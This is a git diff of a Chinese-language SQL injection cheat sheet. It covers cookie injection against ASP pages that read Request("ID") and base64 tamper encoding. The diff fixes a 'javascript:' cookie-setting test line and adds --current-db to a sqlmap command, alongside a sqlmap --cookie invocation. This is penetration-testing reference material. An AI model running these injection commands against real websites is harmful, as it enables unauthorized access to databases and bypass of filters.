@@ -20,7 +20,7 @@
 ####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原理:php中，使用超全局变 $_GET，$_POST来接受参数。 asp中，使用Request.QueryString (GET)或 Request.Form (POST)来接收页面提交的参数值，程序不是先取GET中的数据，没有再取POST中的数据，还会去取Cookies中的数据，一般写防护的会忽略cookie防御
 ####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;方法: [cookie中转工具实战](https://blog.51cto.com/yttitan/1562382)、[cookie手注](https://www.cnblogs.com/sun-sunshine123/p/6861677.html)
 ```html
-    avascript:alert（document.ｃookie ="id="+escape("1")); 回车弹出对话框内容为1
+    javascript:alert（document.ｃookie ="id="+escape("1")); 回车弹出对话框内容为1
     刷新一下网页，如果正常显示，表示该页是用Request("ID")这样的格式收集数据，这种格式就可以试Cookies注入了
     
     SQLMap:  sqlmap.py -u "http://172.16.12.2/test.php" --cookie "id=1" --level 2  --level>2才会检查cookie
@@ -38,7 +38,7 @@
 ###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x04 [编码参数(base64)](https://blog.csdn.net/qq_42357070/article/details/81512470)
 
 ```
-    sqlmap -u "URL" --tamper base64encode --level=3 
+    sqlmap -u "URL" --tamper base64encode --level=3 --current-db
     如果手工注入，配合小葵万能编码转换时，是要将整个参数和注入语句一起编码代入
 ```
 
